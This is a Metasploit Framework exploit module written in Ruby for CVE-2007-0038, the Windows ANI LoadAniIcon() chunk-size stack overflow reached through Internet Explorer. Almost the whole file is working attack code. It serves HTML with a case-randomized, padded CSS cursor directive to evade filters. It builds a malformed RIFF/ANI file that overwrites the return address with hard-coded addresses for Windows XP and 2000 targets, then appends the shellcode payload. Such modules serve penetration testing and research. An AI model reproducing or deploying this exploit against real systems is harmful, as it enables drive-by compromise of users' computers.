##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Browser::IE_ANI_CVE_2007_0038 < Msf::Exploit::Remote

	#
	# This module acts as an HTTP server
	#
	include Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Windows ANI LoadAniIcon() Chunk Size Stack Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow vulnerability in the 
				LoadAniIcon() function of USER32.dll. The flaw is triggered
				through Internet Explorer (6 and 7) using the CURSOR style sheet
				directive to load a malicious .ANI file. Internet Explorer will catch any
				exceptions that occur while the	invalid cursor is loaded, causing the 
				exploit to silently fail when the wrong target has been chosen. This 
				module will be updated in the near future to perform client-side 
				fingerprinting and brute forcing. The underlying vulnerability all versions
				of Windows between NT 4.0 and Vista.

				This vulnerability was discovered by Alexander Sotirov of Determina
				and was rediscovered, in the wild, by McAfee.  
			},
			'License'        => MSF_LICENSE,
			'Author'         => 
				[ 
					'hdm',
				],
			'Version'        => '$Revision$',
			'References'     => 
				[
					['CVE', '2007-0038'],
					['CVE', '2007-1765'],
					['BID', '23194'],
					['URL', 'http://www.microsoft.com/technet/security/advisory/935423.mspx'],
					['URL', 'http://www.determina.com/security_center/security_advisories/securityadvisory_0day_032907.asp'],
					['URL', 'http://www.determina.com/security.research/vulnerabilities/ani-header.html'],
				],
			'DefaultOptions' =>
				{
					# Cause the shellcode to exit silently
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'       => 4000 + (rand(1000)),
					'MinNops'     => 32,
					'Compat'      => 
						{
							'ConnectionType' => '-find',
						},
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# All of these targets use call [ebx+4], just like the original exploit
					
					# Partial overwrite for cross-language exploitation (latest user32 only)
					[ 'Windows XP SP2 user32.dll 5.1.2600.2622', { 'Ret' => 0x25ba, 'Len' => 2 }],
					
					# Should work for all English XP SP2
					[ 'Windows XP SP2 userenv.dll English', { 'Ret' => 0x769fc81a }],

					# Should work for English XP SP0/SP1
					[ 'Windows XP SP0/SP1 netui2.dll English', { 'Ret' => 0x71bd0205 }],					
					
					# Should work for English 2000 SP0-SP4+
					[ 'Windows 2000 SP0-SP4 netui2.dll English', { 'Ret' => 0x75116d88 }],					

				],
			'DisclosureDate' => 'Mar 28 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end
	
	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
	
		exts = ['bmp', 'wav', 'png', 'zip', 'tar']
		gext =  exts[rand(exts.length)]
		mext = request.uri =~ /\.(...)$/
		
		if (not (mext and exts.include?($1)))

			html =
				"<html><head><title>"   + rand_text_alphanumeric(rand(128)+4) +
				"</title></head><body>" + rand_text_english(1) +
				"<div style='" +
					generate_css_padding() +
					Rex::Text.to_rand_case("cursor") +
					generate_css_padding() +
					":" +
					generate_css_padding() +
					Rex::Text.to_rand_case("url(") +
					generate_css_padding() +
					'"' +
					get_resource + '/' + rand_text_alphanumeric(rand(80)+16) + ".#{gext}" + '"' +
					generate_css_padding() +
					");" +
					generate_css_padding() +
					"'>" +
					generate_padding() +
				"</div>"
					
			send_response_html(cli, html)
			return
		end

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the compressed response to the client
		send_response(cli, generate_ani(p), { 'Content-Type' => 'application/octet-stream' })
		
		handler(cli)
	end

	def generate_ani(payload)


		# Build the first ANI header
		anih_a = [
			36,            # DWORD cbSizeof
			rand(128)+16,  # DWORD cFrames
			rand(1024)+1,  # DWORD cSteps
			0,             # DWORD cx,cy  (reserved - 0)
			0,             # DWORD cBitCount, cPlanes (reserved - 0)
			0, 0, 0,       # JIF jifRate
			1              # DWORD flags
		].pack('V9')


		# Build the second ANI header (ebp=76, eip=80)
		anih_b = anih_a + rand_text(80-anih_a.length)

		# Overwrite the return with address of a "call ptr [ebx+4]"
		anih_b << [target.ret].pack('V')[0, target['Len'] ? target['Len'] : 4]
		
		# Begin the ANI chunk
		riff = "ACON"
		
		# Insert random RIFF chunks
		0.upto(rand(128)+16) do |i|
			riff << generate_riff_chunk()
		end
		
		# Embed the first ANI header
		riff << "anih" + [anih_a.length].pack('V') + anih_a

		# Insert random RIFF chunks
		0.upto(rand(128)+16) do |i|
			riff << generate_riff_chunk()
		end
		
		# Trigger the return address overwrite
		riff << "anih" + [anih_b.length].pack('V') + anih_b
	
		# Place the RIFF chunk in front and off we go
		ret = "RIFF" + [riff.length].pack('V') + riff + payload.encoded

	end

	def generate_riff_chunk
		tag = Rex::Text.to_rand_case(rand_text_alpha(4))
		dat = rand_text(rand(256)+1) * 2
		tag + [dat.length].pack('V') + dat
	end
	
	def generate_css_padding
		buf =
			generate_whitespace() + 
			"/*" + 
			generate_whitespace() + 
			generate_padding() + 
			generate_whitespace() + 
			"*/" + 
			generate_whitespace()
	end

	def generate_whitespace
		len = rand(100)+2
		set = "\x09\x20\x0d\x0a"			
		buf = ''

		while (buf.length < len)
			buf << set[rand(set.length)].chr
		end
		buf
	end
	
	def generate_padding
		rand_text_alphanumeric(rand(128)+4)
	end

end

end
